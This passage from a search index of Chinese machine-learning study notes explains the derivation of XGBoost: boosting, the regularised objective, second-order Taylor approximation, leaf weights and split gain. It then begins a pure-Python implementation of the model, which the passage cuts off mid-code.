\u662f\u901a\u8fc7\u4f7f\u5f97\u635f\u5931\u51fd\u6570\u6700\u5c0f\u5316\u8ba1\u7b97\u51fa\u6765\u7684\uff0c\u5177\u4f53\u5982\u4f55\u8ba1\u7b97\u5c31\u53d6\u51b3\u4e8e\u6211\u4eec\u4f7f\u7528\u4ec0\u4e48\u5177\u4f53\u7684\u635f\u5931\u51fd\u6570\u548c\u4f18\u5316\u5668\u4e86\u3002 \u540c\u65f6\uff0c \u6211\u4eec\u8fd8\u53ef\u4ee5\u63a8\u51fa\u516c\u5f0f (3) \u3002 F_{m}(\\mathbf{x})=F_{m-1}(\\mathbf{x})+\\beta_{m} h\\left(\\mathbf{x} ; \\mathbf{a}_{m}\\right) \\tag{3} \u516c\u5f0f (3) \u4e2d F_{m}(\\mathbf{x}) \u662f\u8bad\u7ec3\u5b8c m \u4e2a\u5f31\u5206\u7c7b\u5668\u4ee5\u540e\uff0c\u6a21\u578b\u7684\u8f93\u51fa\u7ed3\u679c\u3002 \u516c\u5f0f (3) \u8bf4\u660e GBDT \u5728\u8bad\u7ec3\u6bcf\u7b2c m \u4e2a\u5f31\u5206\u7c7b\u5668\u65f6\uff0c\u6211\u4eec\u9700\u8981\u5148\u5c06\u524d m-1 \u4e2a\u5f31\u5206\u7c7b\u5668\u7684\u9884\u6d4b\u7ed3\u679c\u6c42\u548c\uff0c\u4ece\u800c\u83b7\u5f97\u4e00\u4e2a\u65b0\u7684\u9884\u6d4b\u7ed3\u679c\uff0c\u5728\u6b64\u57fa\u7840\u4e0a\u5bf9\u7b2c m \u4e2a\u5f31\u5206\u7c7b\u5668\u8fdb\u884c\u8bad\u7ec3\u548c\u9884\u6d4b\u3002\u5373\u65b0\u7684\u5f31\u5206\u7c7b\u5668\u662f\u5728\u5df2\u6709\u6a21\u578b\u7684 \u6b8b\u5dee \u4e0a\u8fdb\u884c\u8bad\u7ec3\u7684\u3002 \u53ef\u7406\u89e3\u4e3a\u5982\u4e0b\u516c\u5f0f\u3002 \\beta_{m} h\\left(\\mathbf{x} ; \\mathbf{a}_{m}\\right) \\to (y_i - \\sum_{k=1}^{m-1} \\beta_{k} h\\left(\\mathbf{x} ; \\mathbf{a}_{k}\\right)) \\tag{4} \u5373\u7b2c m \u4e2a\u5f31\u5206\u7c7b\u5668\u7684\u8bad\u7ec3\u76ee\u6807\u662f\u8f93\u51fa\u8d8b\u8fd1\u4e8e y_i \u548c \u524d m - 1 \u4e2a\u5f31\u5206\u7c7b\u5668\u7684\u7ed3\u679c\u4e4b\u548c\u7684\u5dee\u503c\u3002 \u518d\u7ed3\u5408\u8001\u5e08PPT\u4e2d\u7684\u4f8b\u5b50\uff0c\u5e94\u8be5\u5c31\u80fd\u591f\u5f88\u597d\u5730\u7406\u89e3 Boosting \u7684\u4f5c\u7528\u3002 \\text{Figure 2. Boost Tree} \\text{Figure 3. Model Predict}","title":"2.2. \u8ba1\u7b97\u53c2\u6570"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/1.XGBoost%E5%8E%9F%E7%90%86%E7%AE%80%E4%BB%8B/#3-xgboost","text":"\u4e86\u89e3\u4e86 Boosting \u4e4b\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f00\u59cb\u5b66\u4e60 XGBoost \u4e86\uff0c\u9996\u5148\u4ece\u5b83\u7684\u76ee\u6807\u51fd\u6570\u5f00\u59cb\u5206\u6790\u3002 \\text{Figure 4. Object Function} \u6211\u4eec\u4e00\u822c\u4f7f\u7528\u6811\u6a21\u578b\u6765\u4f5c\u4e3a\u5f31\u5206\u7c7b\u5668\uff0c\u5047\u8bbe\u6709 K \u9897\u6811\uff0c\u5bf9\u7b2c i \u4e2a\u8f93\u5165\uff0c\u5b83\u4eec\u7684\u9884\u6d4b\u503c\u4e3a \\widehat{y}_i \u3002 \\widehat{y}_{i}=\\sum_{k=1}^{K} f_{k}\\left(\\mathbf{x}_{i}\\right),\\ \\ f_{k} \\in {\\mathcal{F}} \\tag{5} \u516c\u5f0f (5) \u4e2d f_k(\\mathbf{x}_i) \u8868\u793a\u7b2c k \u9897\u6811\u5bf9\u7b2c i \u4e2a\u8f93\u5165\u5411\u91cf\u7684\u9884\u6d4b\u8f93\u51fa\u3002 \u800c XGBoost \u7684\u76ee\u6807\u51fd\u6570\u7531\u635f\u5931\u51fd\u6570\u548c\u60e9\u7f5a\u51fd\u6570\u7ec4\u6210\uff0c\u8fd9\u4e00\u70b9\u5927\u591a\u6570\u673a\u5668\u5b66\u4e60\u6a21\u578b\u90fd\u5dee\u4e0d\u591a\u3002\u901a\u8fc7\u6700\u5c0f\u5316\u635f\u5931\u51fd\u6570\u6765\u63d0\u9ad8\u9884\u6d4b\u7cbe\u5ea6\uff0c\u5f15\u5165\u60e9\u7f5a\u51fd\u6570\u6765\u63a7\u5236\u6a21\u578b\u590d\u6742\u5ea6\uff0c\u9632\u6b62\u8fc7\u62df\u5408\u3002 Obj = \\sum_{i = 1}^n {l(y_i, \\widehat{y}_{i})} + \\sum_{k = 1}^K \\Omega (f_k) \\tag{6} \u516c\u5f0f (6) \u4e2d\u7684 n \u8868\u793a\u8f93\u5165\u6570\u636e\u7684\u603b\u6570\u76ee\uff0c\u6211\u4eec\u7684\u4f18\u5316\u76ee\u6807\u5c31\u662f\u6700\u5c0f\u5316\u76ee\u6807\u51fd\u6570\u3002 \\min Obj \\tag{7}","title":"3. XGBoost\u7684\u76ee\u6807\u51fd\u6570"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/1.XGBoost%E5%8E%9F%E7%90%86%E7%AE%80%E4%BB%8B/#4","text":"\u6709\u4e86\u76ee\u6807\u51fd\u6570\u4ee5\u540e\uff0c\u6211\u4eec\u8fd8\u6ca1\u6709\u597d\u7684\u529e\u6cd5\u76f4\u63a5\u5bf9\u5b83\u8fdb\u884c\u6c42\u89e3\uff0c\u8fd8\u9700\u8981\u8fdb\u884c\u5316\u7b80\u3002\u56fe5\u662f\u8001\u5e08\u7684PPT\u3002 \\text{Figure 5. Additive Traning} \u56fe5\u7684\u5de6\u534a\u90e8\u5206\u4e3b\u8981\u5728\u89e3\u91caAdditive Traning\uff0c\u548c\u6211\u4eec\u5728 Boosting \u90e8\u5206\u63d0\u5230\u7684\u7c7b\u4f3c\u3002\u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u53f3\u534a\u90e8\u5206\u7684\u5316\u7b80\u8fc7\u7a0b\u3002 \u901a\u8fc7\u5c06 \\widehat{y}_{i} \u5c55\u5f00\uff0c\u53bb\u9664\u5e38\u6570\u9879\uff0c\u53ef\u4ee5\u5c06\u76ee\u6807\u51fd\u6570\u5316\u7b80\u4e3a { \\begin{aligned} Obj &= \\sum_{i = 1}^n {l(y_i, \\widehat{y}_{i}^{(k)})} + \\sum_{k = 1}^K \\Omega (f_k) & \\\\ &= \\sum_{i = 1}^n {l(y_i, \\widehat{y}_{i}^{(k-1)} + f_k(\\mathbf{x}_i) )} + \\Omega (f_k) & \\\\ \\end{aligned} } \\tag{8} \u6b64\u5904\u5229\u7528\u4e86\u516c\u5f0f (5) \u5c06 \\widehat{y}_{i}^{(k)} \u4e2d\u524d k-1 \u9879\u5206\u79bb\u4e86\u51fa\u6765\u3002\u56e0\u4e3a\u524d k-1 \u9879\u5df2\u7ecf\u5728\u5404\u81ea\u7684\u8bad\u7ec3\u8fc7\u7a0b\u4e2d\u4f18\u5316\u8fc7\u4e86\uff0c\u5728\u8fd9\u91cc\u53ef\u4ee5\u89c6\u4e3a\u5e38\u6570\u9879\uff0c\u6240\u4ee5\u6211\u4eec\u5c06\u60e9\u7f5a\u51fd\u6570\u4e2d\u7684\u524d k-1 \u9879\u53bb\u9664\uff0c\u4ec5\u8003\u8651\u8981\u4f18\u5316\u7684 f_k \u90e8\u5206\u3002","title":"4. \u5316\u7b80\u76ee\u6807\u51fd\u6570"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/1.XGBoost%E5%8E%9F%E7%90%86%E7%AE%80%E4%BB%8B/#5","text":"\u5c3d\u7ba1\u6211\u4eec\u5bf9\u76ee\u6807\u51fd\u6570\u8fdb\u884c\u4e86\u5316\u7b80\uff0c\u4f46\u76f4\u63a5\u5bf9\u76ee\u6807\u51fd\u6570\u8fdb\u884c\u6c42\u89e3\uff0c\u8fd0\u7b97\u7684\u590d\u6742\u5ea6\u4f1a\u975e\u5e38\u9ad8\uff0c\u6240\u4ee5\u6211\u4eec\u9009\u62e9\u5bf9\u76ee\u6807\u51fd\u6570\u8fdb\u884c\u4e8c\u7ea7\u6cf0\u52d2\u5c55\u5f00\uff0c\u63d0\u9ad8\u6a21\u578b\u7684\u8bad\u7ec3\u901f\u5ea6\u3002 \\text{Figure 6. Taylor Expansion} \u6839\u636e\u516c\u5f0f (9) \u4e2d\u7684\u4e8c\u7ea7\u6cf0\u52d2\u5c55\u5f00\u5f0f\u3002 f(x + \\Delta x) \\approx f(x) + f'(x) \\cdot \\Delta x + \\frac{1}{2} f''(x) \\cdot \\Delta x^2 \\tag{9} \u5bf9\u76ee\u6807\u51fd\u6570\u8fdb\u884c\u5c55\u5f00\uff1a { \\begin{aligned} Obj &= \\sum_{i = 1}^n {l(y_i, \\widehat{y}_{i}^{(k-1)} + f_k(\\mathbf{x}_i) )} + \\Omega (f_k) & \\\\ &= \\sum_{i=1}^{n}\\left[l\\left(y_{i}, \\hat{y}^{(k-1)}\\right)+g_{i} f_{k}\\left(\\mathbf{x}_{i}\\right)+\\frac{1}{2} h_{i} f_{k}^{2}\\left(\\mathbf{x}_{i}\\right)\\right]+\\Omega\\left(f_{k}\\right) &\\\\ \\end{aligned} } \\tag{10} \u5176\u4e2d g_{i}=\\partial_{\\hat{y}(k-1)} l\\left(y_{i}, \\hat{y}^{(k-1)}\\right) \u4e14 h_{i}=\\partial_{\\hat{y}(k-1)}^{2} l\\left(y_{i}, \\hat{y}^{(k-1)}\\right) \uff0c \u5bf9\u5e94\u4e8c\u7ea7\u6cf0\u52d2\u5c55\u5f00\u5f0f\u4e2d\u7684\u4e00\u9636\u5bfc\u6570\u548c\u4e8c\u9636\u5bfc\u6570\uff0c\u7531\u4e8e\u5b83\u4eec\u90fd\u662f\u57fa\u4e8e\u524d k - 1 \u4e2a\u6a21\u578b\u7684\uff0c\u6240\u4ee5\u5728\u8bad\u7ec3\u7b2c k \u4e2a\u6a21\u578b\u65f6\u4e5f\u662f\u5df2\u77e5\u7684\uff0c\u53ef\u4ee5\u89c6\u4e3a\u5e38\u6570\u9879\u3002 \u516c\u5f0f (10) \u4e2d\uff0c l(y_{i}, \\hat{y}^{(k-1)}) \u4e5f\u53ef\u89c6\u4e3a\u5e38\u6570\u9879\uff0c\u5e76\u4e14\u8fd9\u4e00\u9879\u6ca1\u6709\u548c\u53d8\u91cf f_k(\\mathbf{x}_i) \u76f8\u4e58\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5c06\u5c55\u5f00\u540e\u7684\u76ee\u6807\u51fd\u6570\u518d\u6b21\u8fdb\u884c\u5316\u7b80\uff0c\u7ed3\u679c\u4e3a\uff1a Obj =\\sum_{i=1}^{n}\\left[g_{i} f_{k}\\left(\\mathbf{x}_{i}\\right)+\\frac{1}{2} h_{i} f_{k}^{2}\\left(\\mathbf{x}_{i}\\right)\\right]+\\Omega\\left(f_{k}\\right) \\tag{11}","title":"5. \u4f7f\u7528\u6cf0\u52d2\u7ea7\u6570\u8fd1\u4f3c\u76ee\u6807\u51fd\u6570"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/1.XGBoost%E5%8E%9F%E7%90%86%E7%AE%80%E4%BB%8B/#6","text":"\u5728\u516c\u5f0f (5) \u4e2d \uff0c\u6211\u4eec\u63d0\u5230 f_k(\\mathbf{x}_i) \u8868\u793a\u7b2c k \u9897\u6811\u5bf9\u7b2c i \u4e2a\u8f93\u5165\u5411\u91cf\u7684\u9884\u6d4b\u8f93\u51fa\u3002\u90a3\u4e48\u6211\u4eec\u53c8\u5e94\u8be5\u5982\u4f55\u5728\u516c\u5f0f\u4e2d\u5c06 f_k(\\mathbf{x}_i) \u5c55\u5f00\uff0c\u4ece\u800c\u8fdb\u884c\u8bad\u7ec3\u548c\u8c03\u4f18\uff0c\u6700\u7ec8\u8fbe\u5230\u4f18\u5316\u6a21\u578b\u7684\u76ee\u7684\u5462\u3002\u8fd9\u91cc\u6211\u4eec\u5c31\u9700\u8981\u5c06\u6a21\u578b\u53c2\u6570\u5316\uff0c\u5c06\u95ee\u9898\u8f6c\u5316\u4e3a\u53c2\u6570\u4f18\u5316\u7684\u95ee\u9898\u3002 \u90a3\u4e48\u6211\u4eec\u8fd9\u4e00\u8282\u8981\u89e3\u51b3\u7684\u5b50\u95ee\u9898\u5c31\u662f\uff0c\u5982\u4f55\u7528\u53c2\u6570\u7684\u5f62\u5f0f\u6765\u8868\u793a\u4e00\u9897\u51b3\u7b56\u6811\uff0c\u6216\u8005\u8bf4\uff0c\u5982\u4f55\u5c06\u51b3\u7b56\u6811\u7684\u6a21\u578b\u53c2\u6570\u5316\u3002 \u6211\u4eec\u53c2\u8003\u5468\u5fd7\u534e\u8001\u5e08 \u300a\u673a\u5668\u5b66\u4e60\u300b 3 \u4e66\u4e2d\u7684\u4e00\u4e2a\u4f8b\u5b50\u3002 graph TD A[\u7eb9\u7406] -->|\u6e05\u6670| B[\u5bc6\u5ea6 <= 0.381?] B --> |\u662f|C[\u574f\u74dc1] B --> |\u5426|D[\u597d\u74dc2] A[\u7eb9\u7406] -->|\u7a0d\u7cca| E[\u89e6\u611f=?] E --> |\u786c\u6ed1|F[\u574f\u74dc3] E --> |\u8f6f\u7c98|G[\u597d\u74dc4] A[\u7eb9\u7406] -->|\u6a21\u7cca| H[\u574f\u74dc5] \\text{Figure 7. Decision Tree} \u8bbe \\widehat{y}_i = 1 \u8868\u793a\u6a21\u578b\u9884\u6d4b\u7b2c i \u4e2a\u74dc\u4e3a\u597d\u74dc\uff0c \\widehat{y}_i = 0 \u8868\u793a\u6a21\u578b\u9884\u6d4b\u7b2c i \u4e2a\u74dc\u4e3a\u574f\u74dc\u3002\u53f6\u5b50\u8282\u70b9\u6807\u7b7e\u540e\u7684\u6570\u5b57\u4e3a\u53f6\u5b50\u8282\u70b9\u7684\u6807\u53f7\u3002 \u8bbe I_j = \\{i | q(\\mathbf{x}_{i}) = j\\} \u4e3a\u88ab\u5206\u5230\u7b2c j \u4e2a\u53f6\u5b50\u8282\u70b9\u4e2d\u7684 \\mathbf{x}_{i} \u7684\u5e8f\u53f7\u96c6\u5408\u3002 q(\\mathbf{x}_{i}) \u4e3a\u8f93\u5165 \\mathbf{x}_{i} \u5230\u53f6\u5b50\u8282\u70b9\u5e8f\u53f7\u7684\u6620\u5c04\u3002 \u8bbe w_j = \\alpha (j) \u4e3a\u7b2c j \u4e2a\u53f6\u5b50\u8282\u70b9\u7684 \\widehat{y} \u503c\u3002\u53d6\u6837\u4f8b\u6570\u636e\u8fdb\u884c\u8bf4\u660e\uff1a \\text{Table 1. Sample Data} \u5e8f\u53f7 \u7eb9\u7406 \u89e6\u611f \u5bc6\u5ea6 \u597d\u74dc 1 \u6e05\u6670 \u786c\u6ed1 0.697 \u662f 2 \u6e05\u6670 \u8f6f\u7c98 0.267 \u5426 3 \u7a0d\u7cca \u786c\u6ed1 0.091 \u5426 \u5219 { \\begin{aligned} f_k(\\mathbf{x}_{1}) = \\alpha (q(\\mathbf{x}_{1})) =\\alpha(2)=1 = w_2 & \\\\ f_k(\\mathbf{x}_{2}) = \\alpha (q(\\mathbf{x}_{2})) =\\alpha(1)=0 = w_1 & \\\\ f_k(\\mathbf{x}_{3}) = \\alpha (q(\\mathbf{x}_{3})) =\\alpha(3)=0 = w_3 & \\\\ \\end{aligned} } \u6839\u636e\u4e0a\u9762\u7684\u5b9a\u4e49\uff0c\u6211\u4eec\u7ee7\u7eed\u5bf9\u76ee\u6807\u51fd\u6570\u8fdb\u884c\u5316\u7b80\u3002 \u9996\u5148\u5c55\u5f00\u60e9\u7f5a\u51fd\u6570: \\Omega(f)=\\gamma T+\\frac{1}{2} \\lambda\\|w\\|^{2} \\tag{12} \\begin{aligned} Obj &=\\sum_{i=1}^{n}\\left[g_{i} f_{k}\\left(\\mathbf{x}_{i}\\right)+\\frac{1}{2} h_{i} f_{k}^{2}\\left(\\mathbf{x}_{i}\\right)\\right]+\\gamma T+\\frac{1}{2} \\lambda \\sum_{j=1}^{T} w_{j}^{2}\\\\ \\end{aligned} \\tag{13} \u516c\u5f0f (12) \u4e2d \\gamma \u4e3a\u6811\u7684\u6df1\u5ea6\uff0c T \u4e3a\u53f6\u5b50\u8282\u70b9\u4e2a\u6570\uff0c \\lambda \u4e3a\u60e9\u7f5a\u9879\u7cfb\u6570\u3002 \\|w\\|^{2} \u4e3aL2\u6b63\u5219\u5316\u9879\u3002\u516c\u5f0f (13) \u4e3a\u5c06\u60e9\u7f5a\u51fd\u6570\u5e26\u5165\u540e\u7684\u76ee\u6807\u51fd\u6570\u3002 \u4e0b\u9762\u5c06 f_{k}\\left(\\mathbf{x}_{i}\\right) \u4ece\u5bf9\u6bcf\u4e00\u9879\u8f93\u5165\u6570\u636e\u7684\u8f93\u51fa\u6c42\u548c\uff0c\u8f6c\u4e3a\u5bf9\u6bcf\u4e00\u4e2a\u53f6\u5b50\u8282\u70b9\u7684\u8f93\u51fa\u6c42\u548c\u3002 Obj=\\sum_{j=1}^{T}\\left[\\left(\\sum_{i \\in I_{j}} g_{i}\\right) w_{j}+\\frac{1}{2}\\left(\\sum_{i \\in I_{j}} h_{i}+\\lambda\\right) w_{j}^{2}\\right]+\\gamma T \\tag{14} \u516c\u5f0f (14) \u4e2d I_j = \\{i | q(\\mathbf{x}_{i}) = j\\} \u662f\u88ab\u5206\u5230\u7b2c j \u4e2a\u53f6\u5b50\u8282\u70b9\u4e2d\u7684 \\mathbf{x}_{i} \u7684\u5e8f\u53f7\u96c6\u5408\u3002","title":"6. \u6a21\u578b\u53c2\u6570\u5316"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/1.XGBoost%E5%8E%9F%E7%90%86%E7%AE%80%E4%BB%8B/#7","text":"\u6211\u4eec\u5047\u8bbe\u6811\u7684\u7ed3\u6784 q(\\mathbf{x}_{i}) \u662f\u786e\u5b9a\u7684\uff0c\u5373\u516c\u5f0f (13) \u4e2d\uff0c \\gamma \u548c T \u4e24\u4e2a\u53c2\u6570\u662f\u786e\u5b9a\u7684\uff0c I_j \u4e5f\u662f\u786e\u5b9a\u7684\uff0c\u5269\u4e0b\u7684\u81ea\u53d8\u91cf\u5c31\u53ea\u6709 w_j^2 \uff0c\u6211\u4eec\u5c31\u5f97\u5230\u4e86\u4e00\u4e2a\u4e00\u5143\u4e8c\u6b21\u65b9\u7a0b\u3002 \u8981\u4f7f\u8fd9\u4e2a\u4e00\u5143\u4e8c\u6b21\u65b9\u7a0b\u6700\u5c0f\uff0c\u6211\u4eec\u5c31\u9700\u8981\u627e\u5230\u5b83\u7684\u6781\u503c\u70b9\u3002 \u9996\u5148\u8003\u8651\u4e8c\u6b21\u9879\u7cfb\u6570\u7684\u6b63\u8d1f\u6027\u3002 \\lambda \u662f\u60e9\u7f5a\u9879\u7cfb\u6570\uff0c\u662f\u975e\u8d1f\u7684\uff0c\u800c h_{i}=\\partial_{\\hat{y}(k-1)}^{2} l\\left(y_{i}, \\hat{y}^{(k-1)}\\right) \uff0c\u662f\u635f\u5931\u51fd\u6570\u7684\u4e8c\u9636\u5bfc\u6570\u3002 \u6211\u4eec\u53c2\u8003 \u300a\u795e\u7ecf\u7f51\u7edc\u4e0e\u6df1\u5ea6\u5b66\u4e60\u300b 4 \u4e2d\u7ed9\u51fa\u7684\u5e38\u7528\u635f\u5931\u51fd\u6570\u3002 \\text{Figure 8. Loss Function} XGBoost \u5e38\u7528\u7684\u662f\u5e73\u65b9\u635f\u5931\uff0c\u5b83\u7684\u4e8c\u9636\u5bfc\u51fd\u6570\u6052\u4e3a\u6b63\u6570\u3002\u6240\u4ee5\u76ee\u6807\u51fd\u6570\u4e8c\u6b21\u9879\u7cfb\u6570\u4e5f\u6052\u4e3a\u6b63\u3002 \u6240\u4ee5\u6211\u4eec\u6839\u636e\u4e00\u5143\u4e8c\u6b21\u65b9\u7a0b\u7684\u6027\u8d28\uff0c\u6c42\u89e3\u76ee\u6807\u51fd\u6570\u7684\u6700\u5c0f\u503c\u3002 w_{j}^{*}=-\\frac{\\sum_{i \\in I_{j}} g_{i}}{\\sum_{i \\in I_{j}} h_{i}+\\lambda} \\tag{15} \u5e26\u5165\u516c\u5f0f (14) \u53ef\u6c42\u5f97 Obj(q)=-\\frac{1}{2} \\sum_{j=1}^{T} \\frac{\\left(\\sum_{i \\in I_{j}} g_{i}\\right)^{2}}{\\sum_{i \\in I_{j}} h_{i}+\\lambda}+\\gamma T \\tag{16} \u516c\u5f0f (16) \u4e2d q \u4e3a\u67d0\u4e00\u786e\u5b9a\u7684\u6811\u7ed3\u6784\u3002 Obj(q) \u53ef\u4ee5\u4f5c\u4e3a\u8bc4\u5206\u51fd\u6570\uff0c\u7528\u6765\u8ba1\u7b97\u6811\u7ed3\u6784\u7684\u5f97\u5206\u3002\u7c7b\u4f3c\u4e8e\u51b3\u7b56\u6811\u6a21\u578b\u4e2d\u7684\u4fe1\u606f\u71b5(Information Entropy)\u3002 \u7531\u4e8e\u904d\u5386\u6240\u6709\u7684\u6811\u7ed3\u6784\u662f\u4e00\u4e2a NP \u95ee\u9898\uff0c\u6240\u4ee5 XGBoost \u91c7\u7528\u4e86\u8d2a\u5fc3\u7b97\u6cd5\u6765\u6c42\u5f97\u6811\u7ed3\u6784\u7684\u5c40\u90e8\u6700\u4f18\u89e3\u3002 \u5047\u8bbe I_L \u548c I_R \u662f\u5206\u5272\u540e\u7684\u5de6\u8282\u70b9\u548c\u53f3\u8282\u70b9\u7684 \\mathbf{x}_{i} \u7684\u5e8f\u53f7\u96c6\u5408\uff0c I = I_L \\bigcup I_R \uff0c\u90a3\u4e48\u6bcf\u6b21\u5206\u88c2\u540e Obj(q) \u7684\u51cf\u5c11\u503c\u4e3a\uff1a \\mathcal{L}_{s p l i t}=\\frac{1}{2}\\left[\\frac{\\left(\\sum_{i \\in I_{L}} g_{i}\\right)^{2}}{\\sum_{i \\in I_{L}} h_{i}+\\lambda}+\\frac{\\left(\\sum_{i \\in I_{R}} g_{i}\\right)^{2}}{\\sum_{i \\in I_{R}} h_{i}+\\lambda}-\\frac{\\left(\\sum_{i \\in I} g_{i}\\right)^{2}}{\\sum_{i \\in I} h_{i}+\\lambda}\\right]-\\gamma \\tag{17} \u8fd9\u4e2a\u516c\u5f0f\u53ef\u4ee5\u7528\u6765\u641c\u7d22\u6700\u4f73\u7684\u5206\u88c2\u70b9\uff0c\u7c7b\u4f3c\u4e8e\u51b3\u7b56\u6811\u4e2d\u7684\u4fe1\u606f\u589e\u76ca(Information Gain)\u3002 \u63a5\u4e0b\u6765\u7684\u8fc7\u7a0b\u5c31\u548c\u4e00\u822c\u7684\u51b3\u7b56\u6811\u8bad\u7ec3\u8fc7\u7a0b\u7c7b\u4f3c\u4e86\uff0c\u8bba\u6587\u4e2d\u4e5f\u7ed9\u4e86\u4e24\u4e2a\u641c\u7d22\u6700\u4f73\u5206\u88c2\u70b9\u7684\u7b97\u6cd5\uff0c\u6211\u4eec\u5c31\u4e0d\u505a\u8be6\u7ec6\u8ba8\u8bba\u4e86\u3002 \\text{Figure 9. Algorithm 1} \\text{Figure 10. Algorithm 2} XGBoost \u4e3b\u8981\u7684\u5185\u5bb9\u5927\u6982\u5c31\u662f\u8fd9\u4e9b\uff0c\u5e0c\u671b\u4e86\u89e3\u66f4\u52a0\u8be6\u7ec6\u5185\u5bb9\u7684\u540c\u5b66\u53ef\u4ee5\u67e5\u770b \u539f\u59cb\u8bba\u6587 \u3002","title":"7. \u5bfb\u627e\u6700\u4f73\u5206\u88c2\u70b9"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/1.XGBoost%E5%8E%9F%E7%90%86%E7%AE%80%E4%BB%8B/#8","text":"[1] T. Chen, C. Guestrin, Xgboost: A scalable tree boosting system, CoRR abs/1603.02754. arXiv:1603.02754. [2] J. Friedman, Greedy function approximation: A gradient boosting machine, The Annals of Statistics 29. doi:10.1214/aos/1013203451. [3] \u5468\u5fd7\u534e, \u673a\u5668\u5b66\u4e60, no. 84-85, \u6e05\u534e\u5927\u5b66\u51fa\u7248\u793e, 2016. [4] \u90b1\u9521\u9e4f, \u795e\u7ecf\u7f51\u7edc\u4e0e\u6df1\u5ea6\u5b66\u4e60, no. 74, Github, 2020. \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"8. \u53c2\u8003\u6587\u732e"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/2.XGBoost%E7%9A%84%E7%BA%AFPython%E5%AE%9E%E7%8E%B0/","text":"XGBoost\u7684\u7eafPython\u5b9e\u73b0 # \u76ee\u5f55 # XGBoost\u7684\u7eafPython\u5b9e\u73b0 \u76ee\u5f55 1. \u80cc\u666f 2. XGBoost\u7684\u7eafPython\u5b9e\u73b0 3. \u8c03\u7528XGBoost\u5e93\u51fd\u6570 1. \u80cc\u666f # \u5728 \u4e0a\u4e00\u671f\u7684\u7b14\u8bb0\u4e2d \uff0c\u6211\u4eec\u4e3b\u8981\u8ba8\u8bba\u4e86 XGBoost \u7684\u539f\u7406\uff0c\u6700\u8fd1\u6211\u5728\u516c\u4f17\u53f7 \u673a\u5668\u5b66\u4e60\u5b9e\u9a8c\u5ba4 \u770b\u5230\u4e00\u7bc7\u6587\u7ae0\uff0c\u91cc\u9762\u7ed9\u51fa\u4e86 XGBoost \u7684\u7eafpython\u5b9e\u73b0\uff0c\u521a\u597d\u80fd\u591f\u4f5c\u4e3a\u8865\u5145\uff0c\u4e8e\u662f\u6211\u5c06\u4ee3\u7801\u6458\u5f55\u4e86\u8fc7\u6765\uff0c\u65b9\u4fbf\u5b66\u4e60\u548c\u8bb0\u5f55\u3002 2. XGBoost\u7684\u7eafPython\u5b9e\u73b0 # \u5b9a\u4e49XGBoost\u5355\u68f5\u6811\u6a21\u578b\u5982\u4e0b\uff1a class XGBoostTree(Tree): # \u7ed3\u70b9\u5206\u88c2 def _split(self, y): col = int(np.shape(y)[1]/2) y, y_pred = y[:, :col], y[:, col:] return y, y_pred # \u4fe1\u606f\u589e\u76ca\u8ba1\u7b97\u516c\u5f0f def _gain(self, y, y_pred): Gradient = np.power((y * self.loss.gradient(y, y_pred)).sum(), 2) Hessian = self.loss.hess(y, y_pred).sum() return 0.5 * (Gradient / Hessian) # \u6811\u5206\u88c2\u589e\u76ca\u8ba1\u7b97 def _gain_by_taylor(self, y, y1, y2): # \u7ed3\u70b9\u5206\u88c2 y, y_pred = self._split(y) y1, y1_pred = self._split(y1) y2, y2_pred = self._split(y2) true_gain = self._gain(y1, y1_pred) false_gain = self._gain(y2, y2_pred) gain = self._gain(y, y_pred) return true_gain + false_gain - gain # \u53f6\u5b50\u7ed3\u70b9\u6700\u4f18\u6743\u91cd def _approximate_update(self, y): # y split into y, y_pred y, y_pred = self._split(y) # Newton's Method gradient = np.sum(y * self.loss.gradient(y, y_pred), axis=0) hessian = np.sum(self.loss.hess(y, y_pred), axis=0) update_approximation = gradient / hessian return update_approximation # \u6811\u62df\u5408\u65b9\u6cd5 def fit(self, X, y): self._impurity_calculation = self._gain_by_taylor self._leaf_value_calculation = self._approximate_update super(XGBoostTree, self).fit(X, y) \u7136\u540e\u6839\u636e\u524d\u5411\u5206\u6b65\u7b97\u6cd5\u5b9a\u4e49XGBoost\u6a21\u578b\uff1a class XGBoost(object): def __init__(self, n_estimators=200, learning_rate=0.001, min_samples_split=2, min_impurity=1e-7, max_depth=2): self.n_estimators = n_estimators # Number of trees self.learning_rate = learning_rate # Step size for weight update self.min_samples_split = min_samples_split # The minimum n of sampels to justify split self.min_impurity = min_impurity # Minimum variance reduction to continue self.max_depth = max_depth # Maximum depth for tree # \u4ea4\u53c9\u71b5\u635f\u5931 self.loss = LogisticLoss() # \u521d\u59cb\u5316\u6a21\u578b self.estimators = [] # \u524d\u5411\u5206\u6b65\u8bad\u7ec3 for _ in range(n_estimators): tree = XGBoostTree( min_samples_split=self.min_samples_split, min_impurity=min_impurity, 